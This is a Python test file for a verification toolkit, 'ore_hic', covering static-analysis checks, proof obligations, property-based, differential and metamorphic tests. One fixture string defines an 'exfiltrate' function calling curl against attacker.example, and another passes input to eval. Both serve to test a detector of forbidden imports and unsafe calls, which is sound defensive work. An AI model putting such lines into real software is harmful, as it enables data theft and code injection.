"""Phase G tests: static checks, proofs, property/differential tests (Steps 45-49)."""
from __future__ import annotations

from ore_hic import (
    AssignmentProblem,
    AssignmentReport,
    Candidate,
    CandidateFamily,
    CandidatePlan,
    InstanceGenerator,
    ProofEngine,
    PropertyRunner,
    StaticAnalyzer,
    Verifier,
    check_capacity,
    check_exactly_one,
    check_failure_report,
)
from ore_hic.discovery import AlgorithmDiscovery, greedy_by_task
from ore_hic.verification import DifferentialRunner, MetamorphicRunner

GOOD_SOURCE = '''
import math
from dataclasses import dataclass

def compute(x):
    """Doc."""
    return math.sqrt(x)
'''

BAD_SOURCE = '''
import socket
import os

def exfiltrate():
    return os.system("curl attacker.example")
'''

EVAL_SOURCE = '''
def sneaky(code):
    return eval(code)
'''


def test_step45_static_analysis_catches_forbidden_imports():
    analyzer = StaticAnalyzer()
    findings = analyzer.analyze_source(BAD_SOURCE, "bad.py")
    codes = {f.code for f in findings if f.severity == "ERROR"}
    assert "FORBIDDEN_IMPORT" in codes


def test_step45_static_analysis_catches_unapproved_imports():
    analyzer = StaticAnalyzer()
    findings = analyzer.analyze_source("import numpy\nx = 1\n", "u.py")
    assert any(f.code == "UNAPPROVED_IMPORT" and f.severity == "ERROR" for f in findings)


def test_step45_static_analysis_catches_unsafe_calls():
    analyzer = StaticAnalyzer()
    findings = analyzer.analyze_source(EVAL_SOURCE, "eval.py")
    assert any(f.code == "UNSAFE_CALL" and f.severity == "ERROR" for f in findings)


def test_step45_static_analysis_allows_clean_code():
    analyzer = StaticAnalyzer()
    findings = analyzer.analyze_source(GOOD_SOURCE, "good.py")
    assert not [f for f in findings if f.severity == "ERROR"]


def test_step46_proof_obligations_discharged_or_marked_unproven():
    obligations = ProofEngine().assignment_step_obligations()
    assert obligations
    for obligation in obligations:
        assert obligation.status in {"DISCHARGED", "UNPROVEN", "COUNTEREXAMPLE"}
        # Unproven obligations record their scope instead of hiding it.
        if obligation.status == "UNPROVEN":
            assert "not a full proof" in obligation.evidence or "unproven status is recorded" in obligation.evidence


def test_step47_property_tests_pass_for_correct_candidate():
    discovery = AlgorithmDiscovery()

    class FakeModel:
        model_family = "TASK_ASSIGNMENT_ILP"
        artifact_id = "m"

    candidate = discovery.generate_candidates(FakeModel())[0]
    runner = PropertyRunner(cases=15, seed=11)
    results = runner.run(candidate)
    assert results
    for result in results:
        assert result.passed, f"{result.property_id} failed: {result.counterexample}"


def test_step47_property_tests_find_and_minimize_counterexamples():
    """A deliberately broken candidate must be caught and shrunk."""

    def overassign(problem: AssignmentProblem) -> AssignmentReport:
        # Ignores capacity: puts everything on the first eligible module.
        assignment = {}
        for task in problem.tasks:
            for module in problem.modules:
                if problem.eligible(task.task_id, module.module_id):
                    assignment[task.task_id] = module.module_id
                    break
        return AssignmentReport("COMPLETED", assignment, 0.0, ())

    broken = Candidate(
        candidate_id="cand-broken",
        family=CandidateFamily.GREEDY_SELECTION,
        display_name="broken",
        plan=CandidatePlan((), (), (), "O(n)", "none", "shared"),
        procedure=overassign,
        applicability="APPLICABLE",
        inapplicable_reason="",
        estimated_time="O(n)",
        estimated_space="O(n)",
        assumptions=(),
        selection_rationale="test",
    )
    runner = PropertyRunner(cases=25, seed=5)
    results = runner.run(broken)
    failed = [r for r in results if not r.passed]
    assert failed, "the broken candidate must be caught"
    capacity_failure = next(r for r in failed if r.property_id == "prop-capacity")
    assert capacity_failure.counterexample is not None
    assert capacity_failure.minimized, "the counterexample must be minimized"
    ce = capacity_failure.counterexample
    # Greedy shrinking stops at a local minimum: some tasks were removed
    # (original instances have up to 6) and the failure was preserved.
    assert len(ce["tasks"]) < 6, "shrinker should reduce the failing instance"


def test_step47_properties_cover_empty_boundary_and_adversarial_inputs():
    generator = InstanceGenerator(seed=3)
    for _ in range(20):
        problem = generator.generate()
        report = greedy_by_task(problem)
        assert check_exactly_one(report, problem)
        assert check_capacity(report, problem)
        assert check_failure_report(report, problem)


def test_step48_differential_testing_against_trusted_reference():
    discovery = AlgorithmDiscovery()

    class FakeModel:
        model_family = "TASK_ASSIGNMENT_ILP"
        artifact_id = "m"

    candidates = discovery.generate_candidates(FakeModel())
    greedy = next(c for c in candidates if c.candidate_id == "cand-001")
    exhaustive = next(c for c in candidates if c.candidate_id == "cand-003")
    runner = DifferentialRunner(cases=30, seed=9)
    result = runner.compare(exhaustive, exhaustive)
    assert result.verdict == "MATCH"
    # Greedy vs exhaustive: false negatives are quantified, not hidden.
    greedy_vs_ref = runner.compare(greedy, exhaustive)
    assert greedy_vs_ref.instances == 30
    assert greedy_vs_ref.mismatches >= 0


def test_step48_metamorphic_permutation_invariance():
    discovery = AlgorithmDiscovery()

    class FakeModel:
        model_family = "TASK_ASSIGNMENT_ILP"
        artifact_id = "m"

    candidate = discovery.generate_candidates(FakeModel())[0]
    runner = MetamorphicRunner(cases=15, seed=4)
    result = runner.permutation_invariance(candidate)
    assert result.passed, result.counterexample
    conservation = runner.conservation(candidate)
    assert conservation.passed, conservation.counterexample


def test_step49_traceability_reports_gaps():
    """Traceability must expose coverage limits instead of claiming perfection."""
    verifier = Verifier(cases=5, seed=2)
    assert verifier.traceability_analyzer is not None


def test_verifier_rejects_hard_violators_in_verdict():
    """A candidate set where every candidate violates constraints fails."""
    from ore_hic import CandidateSet
    from ore_hic.requirements import (
        AcceptanceCriterion,
        RequirementSpec,
        StateMachine,
        TerminationCriteria,
    )

    def wrong(problem):
        return AssignmentReport("COMPLETED", {t.task_id: "mX" for t in problem.tasks}, 0.0, ())

    bad = Candidate(
        candidate_id="cand-bad",
        family=CandidateFamily.GREEDY_SELECTION,
        display_name="bad",
        plan=CandidatePlan((), (), (), "O(1)", "none", "shared"),
        procedure=wrong,
        applicability="APPLICABLE",
        inapplicable_reason="",
        estimated_time="O(1)",
        estimated_space="O(1)",
        assumptions=(),
        selection_rationale="test",
    )
    candidate_set = CandidateSet(
        artifact_id="cs-test",
        model_id="m-test",
        candidates=(bad,),
        comparisons=(),
        selected_id=None,
        shortlist=(),
        deferred=True,
    )
    spec = RequirementSpec(
        artifact_id="spec",
        graph_id="g",
        requirements=(),
        objectives=(),
        interfaces=(),
        actors=(),
        preconditions=(),
        postconditions=(),
        invariants=(),
        constraints=(),
        state_machine=StateMachine(("A",), (), "A"),
        failure_cases=(),
        termination=TerminationCriteria("s", "f", "c", "t", None, 1, "arg"),
        acceptance_criteria=(AcceptanceCriterion("acc-001", "stmt", "PROPERTY", True, "req-001"),),
        unresolved_obligations=(),
    )

    class FakeIRGraph:
        artifact_id = "ir"
        schema_version = "0.1.0"

        def nodes_of(self, node_type):
            return ()

        @property
        def nodes(self):
            return ()

        @property
        def content_digest(self):
            return "ir-d"

        def content_payload(self):
            return {}


    class FakeSession:
        def next_artifact_id(self, kind):
            return f"{kind.value.lower()}-test"

        def register(self, artifact):
            pass

        class ledger:
            @staticmethod
            def record(**kwargs):
                pass

            @staticmethod
            def audit(*args, **kwargs):
                pass

    verifier = Verifier(cases=3, seed=1)
    report = verifier.verify(FakeSession(), candidate_set, spec, FakeIRGraph())
    assert report.verdict == "FAILED"
    assert report.failed_properties
